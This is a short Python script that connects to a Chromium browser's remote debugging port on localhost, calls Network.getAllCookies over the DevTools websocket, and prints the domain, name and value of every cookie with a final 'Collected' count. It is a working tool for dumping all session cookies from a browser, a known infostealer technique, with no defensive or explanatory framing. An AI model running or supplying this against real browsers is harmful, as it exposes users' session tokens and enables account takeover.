import requests
import websocket
import json

DEBUG_PORT = 5000

resp = requests.get(f"http://localhost:{DEBUG_PORT}/json")
targets = resp.json()

if not targets:
    raise Exception("No targets found")

ws_url = targets[0]["webSocketDebuggerUrl"]
print("Connecting to:", ws_url)

ws = websocket.create_connection(ws_url)

msg_id = 1

msg_id += 1
ws.send(json.dumps({
    "id": msg_id,
    "method": "Network.getAllCookies"
}))

while True:
    response = json.loads(ws.recv())
    if response.get("id") == msg_id:
        cookies = response["result"]["cookies"]
        break

counter = 0
for c in cookies:
    print(f"{c['domain']} | {c['name']} = {c['value']}")
    counter += 1

print(f"Collected {counter} cookies")

ws.close()